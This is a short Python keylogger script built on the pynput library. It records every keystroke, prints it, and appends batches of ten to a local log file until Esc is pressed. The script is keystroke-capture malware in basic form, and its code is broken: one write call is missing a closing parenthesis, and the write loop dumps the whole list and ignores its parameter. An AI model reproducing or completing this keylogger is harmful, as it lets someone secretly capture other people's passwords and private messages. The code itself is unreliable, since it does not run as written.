import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    print('{0} pressed'.format(key))

    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_file(key):
    with open("log2.txt", "a") as f:
        for key in keys:
            f.write(str(keys)
            
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
